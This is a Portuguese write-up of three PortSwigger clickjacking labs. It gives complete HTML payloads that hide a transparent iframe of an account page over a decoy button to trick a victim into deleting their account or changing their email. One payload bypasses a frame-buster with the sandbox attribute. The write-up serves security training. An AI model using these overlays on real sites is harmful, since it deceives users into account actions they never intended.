---
title: "PortSwigger - Clickjacking"
author: "imendes"
date: 2026-01-18
subject: "PortSwigger Labs Walkthrough"
description: "Write-up técnico dos laboratórios de Clickjacking da PortSwigger"
lang: pt-BR
titlepage: true
titlepage-color: "483D8B"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
categories: [PortSwigger]
---

## Lab: Basic clickjacking with CSRF token protection
"This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.
To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.
You can log in to your own account using the following credentials: wiener:peter"

1. No exploit server construa um web site com esse body: 
```html
<head>
	<style>
		#target_website {
			position:relative;
			width:500px;
			height:700px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
                        left:60px;
                        top:300px
			}
	</style>
</head>
<body>
	<div id="decoy_website">
	click
	</div>
	<iframe id="target_website" src="https://0ab900a404d6bf7d8210d379007600a6.web-security-academy.net/my-account/">
	</iframe>
</body>
```
2. Ajuste os parâmetros `width`, `height`, `left`, `top` se necessário.
3. Entregue o exploit para a vítima.

## Lab: Clickjacking with form input data prefilled from a URL parameter
"This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.

To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.

You can log in to your own account using the following credentials: wiener:peter"

1. Na requisição `GET /my-account?id=wiener`, insira o parâmetro email, com um email de exemplo. O formulário de mudança de email ficará preenchido.
2. Para o clickjacking, o seguinte HTML será escrito: 
```html
<head>
	<style>
		#target_website {
			position:relative;
			width:500px;
			height:700px;
			opacity:0.0001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
                        left:80px;
                        top:450px
			}
	</style>
</head>
<body>
	<div id="decoy_website"><button type=button>Click me</button></div>
	<iframe id="target_website" src="https://LAB-ID.web-security-academy.net/my-account?email=example@email.com">
	</iframe>
</body>
```
3. Ajuste os parâmetros `width`, `height`, `left`, `top` se necessário.
4. Entregue o exploit para a vítima.

## Lab: Clickjacking with a frame buster script
"This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?

To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.

You can log in to your own account using the following credentials: wiener:peter"

1. O site alvo possui proteção frame buster. É possível detectar usando os scripts dos labs anteriores. 
2. Use o seguinte script, com o atributo `sandbox`, para que o iframe não consiga detectar se está na `top window`
```html
<head>
	<style>
		#target_website {
			position:relative;
			width:500px;
			height:700px;
			opacity:0.0001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
                        left:80px;
                        top:450px
			}
	</style>
</head>
<body>
	<div id="decoy_website"><button type=button>Click me</button></div>
	<iframe id="target_website" src="https://0a06006c04e8c1ac84e324e0009d007c.web-security-academy.net/my-account?email=example@email.com" sandbox="allow-forms"></iframe>
</body>
```
